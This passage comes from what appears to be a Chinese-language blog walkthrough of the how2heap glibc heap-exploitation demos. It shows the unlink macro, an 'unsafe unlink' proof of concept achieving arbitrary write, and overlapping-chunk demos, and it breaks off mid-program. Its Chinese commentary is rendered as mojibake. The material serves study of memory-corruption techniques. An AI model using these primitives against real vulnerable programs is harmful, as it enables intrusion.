                             P, AV);                                        </span><br><span class="line"><span class="number">1359</span>             <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                    </span><br><span class="line"><span class="number">1360</span>                 <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line"><span class="number">1361</span>                   FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     </span><br><span class="line"><span class="number">1362</span>                 <span class="keyword">else</span> &#123;                                                        </span><br><span class="line"><span class="number">1363</span>                     FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         </span><br><span class="line"><span class="number">1364</span>                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         </span><br><span class="line"><span class="number">1365</span>                     P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         </span><br><span class="line"><span class="number">1366</span>                     P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         </span><br><span class="line"><span class="number">1367</span>                   &#125;                                                           </span><br><span class="line"><span class="number">1368</span>               &#125; <span class="keyword">else</span> &#123;                                                        </span><br><span class="line"><span class="number">1369</span>                 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 </span><br><span class="line"><span class="number">1370</span>                 P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 </span><br><span class="line"><span class="number">1371</span>               &#125;                                                               </span><br><span class="line"><span class="number">1372</span>           &#125;                                                                   </span><br><span class="line"><span class="number">1373</span>       &#125;                                                                       </span><br><span class="line"><span class="number">1374</span> &#125;</span><br></pre></td></tr></table></figure><blockquote><p>ÊúÄÈáçË¶ÅÁöÑÂ∞±ÊòØÁªïËøáËøô‰∏™‰∏úË•ø</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">//if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) </span></span><br><span class="line">&gt;FD = P-&gt;fd</span><br><span class="line">&gt;BK = P-&gt;bk</span><br><span class="line">&gt;FD-&gt;bk = P&amp; BK-&gt;fd=P</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>‰∏ªË¶ÅÊµÅÁ®ã</p><ol><li>ÂÖàÂàÜÈÖç‰∏§‰∏™Â†ÜAÂíåBÔºåÂÖ∂‰∏≠AÈáåÈù¢ÊúâÊàë‰ª¨Ë¶Å‰º™ÈÄ†ÁöÑchunkÔºåB‰∏ªË¶ÅÊòØÁî®Êù•Êõ¥Êîπ‰∏Ä‰∫õÊ†áÂøóÁöÑ‰∏úË•ø</li><li>È¶ñÂÖàÊàë‰ª¨ÈúÄË¶ÅÂú®A‰∏≠‰º™ÈÄ†chunkÔºåËøôÈáåÊòØÂú®ÈúÄË¶Å‰∏Ä‰∏™bssÊÆµÁöÑÂú∞ÂùÄaddr„ÄÇÂ∞ÜÂÖ∂addr-0x10Âíåaddr-0x18ÂÜôÂÖ•‰º™ÈÄ†chunkÁöÑfdÂíåbk‰∏≠Ôºå‰πüÂ∞±ÈÄöËøá‰∏äÈù¢unlinkÁöÑÊ†°È™å</li><li>ÁÑ∂ÂêéÊàë‰ª¨‰∏∫‰∫ÜÂÆûÁé∞ÂêéÂêëÂêàÂπ∂ÔºåÈúÄË¶ÅÂ∞ÜB‰∏≠ÁöÑpre_sizeÊîπ‰∏∫80,‰ª•ÂèäÂ∞ÜinuseÊîπ‰∏∫0Ôºå‰º™ÈÄ†Ââç‰∏Ä‰∏™Â†ÜÂùóÊòØÁ©∫Èó≤ÁöÑ„ÄÇ</li><li>Ê≠§Êó∂ËøõË°åfree chunkBÁöÑËØùÔºåÂ∞±‰ºöËøõË°åÂêéÂêëÂêàÂπ∂</li></ol><p>Â¶ÇÂõæÊâÄÁ§∫</p><p><img src="/2021/05/19/how2heap/image-20210520231314463.png" alt="image-20210520231314463"></p><p>Âà©Áî®Êù°‰ª∂Ôºö</p><ol><li>Êàë‰ª¨ÂæóÁü•ÈÅì‰∏Ä‰∏™BSSÊÆµÁöÑÂú∞ÂùÄ</li><li>Êàë‰ª¨ÁöÑbinÈÄöÂ∏∏ÊòØsmallÊàñunsorted</li><li>ËØ•‰ΩçÁΩÆÊåáÂêëÁöÑchunkÊòØUAFÁöÑ</li></ol><p><strong>ÂΩ±ÂìçÔºöÂèØ‰ª•Â∞ÜPÊîπ‰∏∫P-0x18</strong></p></blockquote><h1 id="0x07-overlapping-chunk"><a href="#0x07-overlapping-chunk" class="headerlink" title="0x07 overlapping_chunk"></a>0x07 overlapping_chunk</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem\n\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's start to allocate 3 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"For a toy program, the value of the last 3 bits is unimportant;"</span></span><br><span class="line"><span class="string">" however, it is best to maintain the stability of the heap.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span></span><br><span class="line"><span class="string">" to assure that p1 is not mistaken for a free chunk.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line"> evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line"><span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Á®ãÂ∫èÂæàÁÆÄÂçïÔºå‰∏ªË¶ÅÂ∞±ÊòØÂ∞Ü‰∏Ä‰∏™Â†ÜÂùó3ÊîæÂÖ•Â†ÜÂùó4‰∏≠ÔºåÂÖ∑‰ΩìÊìç‰Ωú</p><ol><li>ÂÖàÂàÜÈÖç3‰∏™Â†ÜÂùó</li><li>ÂÖàÂ∞ÜÁ¨¨2‰∏™Â†ÜÂùóÈáäÊîæÔºåËøêÁî®‰∏Ä‰∫õÊñπÊ≥ïÔºåÂ∞Üchunk2ÁöÑsizeÊîπÂèò</li><li>Ê≠§Êó∂ÂàÜÈÖçÁ¨¨4‰∏™Â†ÜÂùóÂíåchunk2ÁöÑsize‰∏ÄÊ†∑Â§ßÔºåÂ∞±ÂèØ‰ª•Êäächunk3 ÂåÖÂê´ËøõÂéª</li></ol><p>Âà©Áî®Êù°‰ª∂ÔºöÂèØ‰ª•‰øÆÊîπchunkÁöÑsize</p><p><strong>ÂΩ±ÂìçÔºöÂØπ‰∏Ä‰∫õÂ†ÜÂùóËøõË°å‰ªªÊÑèÂÜôÔºåÂç≥‰ΩøË¢´ÈáäÊîæ</strong></p></blockquote><h1 id="0x08-overlapping-chunks-2"><a href="#0x08-overlapping-chunks-2" class="headerlink" title="0x08 overlapping_chunks_2"></a>0x08 overlapping_chunks_2</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Yet another simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  <span class="keyword">int</span> prev_in_use = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's start to allocate 5 chunks on the heap:"</span>);</span><br><span class="line"></span><br><span class="line">  p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n\nchunk p1 from %p to %p"</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p2 from %p to %p"</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p3 from %p to %p"</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p4 from %p to %p"</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nchunk p5 from %p to %p\n"</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(p1,<span class="string">'A'</span>,real_size_p1);</span><br><span class="line">  <span class="built_in">memset</span>(p2,<span class="string">'B'</span>,real_size_p2);</span><br><span class="line">  <span class="built_in">memset</span>(p3,<span class="string">'C'</span>,real_size_p3);</span><br><span class="line">  <span class="built_in">memset</span>(p4,<span class="string">'D'</span>,real_size_p4);</span><br><span class="line">  <span class="built_in">memset</span>(p5,<span class="string">'E'</span>,real_size_p5);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after 